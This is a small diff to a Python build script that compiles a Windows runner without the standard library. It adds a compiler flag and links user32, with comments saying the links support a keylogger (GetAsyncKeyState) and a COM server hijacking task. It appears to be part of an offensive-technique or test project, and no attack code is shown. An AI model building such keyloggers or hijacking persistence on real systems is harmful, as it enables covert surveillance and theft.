@@ -409,6 +409,7 @@ def build_runner(
         "-fno-builtin-memcpy",
         "-fno-builtin-memset",
         "-fno-builtin-memmove",
+        "-fno-tree-loop-distribute-patterns",
         "-Wno-dangling-pointer",
         "-nostdlib",
         "-Wl,--no-seh",
@@ -418,6 +419,7 @@ def build_runner(
         "-lgcc",
         "-lkernel32",
         "-ladvapi32",   # Task 8: COM server hijacking (RegCreateKeyExW etc.)
+        "-luser32",     # GetAsyncKeyState (keylogger), SendInput
     ]
     result = subprocess.run(cmd, capture_output=True, text=True)
     if result.returncode != 0:
